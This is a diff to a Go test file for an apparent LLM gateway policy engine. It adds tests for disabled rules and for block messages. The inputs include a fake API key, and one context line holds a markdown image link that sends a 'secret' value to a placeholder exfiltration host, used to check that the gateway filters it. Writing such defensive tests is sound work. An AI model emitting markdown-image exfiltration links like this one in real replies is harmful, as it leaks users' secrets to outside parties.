@@ -252,6 +252,34 @@ func TestSmallBudgetShowsCents(t *testing.T) {
 	}
 }
 
+func TestDisabledRuleIsSkipped(t *testing.T) {
+	s := DemoSnapshot()
+	for i := range s.Rules {
+		if s.Rules[i].Name == "block-src" {
+			s.Rules[i].Mode = "disabled"
+		}
+	}
+	rc := run(t, s, Input{Secret: secret("k2"), Req: chat("claude-sonnet-5", "key sk-abcdefghijklmnopqrstuvwxyz")}, &fixedUp{})
+	if rc.Verdict == "blocked" {
+		t.Fatalf("a disabled rule blocked: %s", rc.ErrorDetail)
+	}
+	for _, ev := range rc.Rules {
+		if ev.Name == "block-src" {
+			t.Fatalf("a disabled rule was evaluated: %+v", ev)
+		}
+	}
+}
+
+func TestBlockWithoutEntityNamesTheRule(t *testing.T) {
+	s := DemoSnapshot()
+	s.Rules = append(s.Rules, model.PolicyRule{ID: "r9", Ordinal: 9, Name: "no-web", Mode: "enforce", FailMode: "closed", Version: 1,
+		When: []model.Cond{{Field: "team", Op: "is", Value: []string{"web"}}}, Then: []model.Action{{Action: "block"}}})
+	rc := run(t, s, Input{Secret: secret("k4"), Req: chat("gpt-5-mini", "hi")}, &fixedUp{})
+	if rc.ErrorCode != "policy_blocked" || rc.ErrorDetail != "Rule no-web v1 blocks this request." || rc.Trace[2].Outcome != "blocked by no-web v1" {
+		t.Fatalf("got %s %q, rules step %+v", rc.ErrorCode, rc.ErrorDetail, rc.Trace[2])
+	}
+}
+
 func TestExfilTruncates(t *testing.T) {
 	rc := run(t, DemoSnapshot(), Input{Secret: secret("k1"), Req: chat("gpt-5-mini", "hi")},
 		&fixedUp{content: "fine text ![x](https://exfil.example.net/c?d=secret) more"})
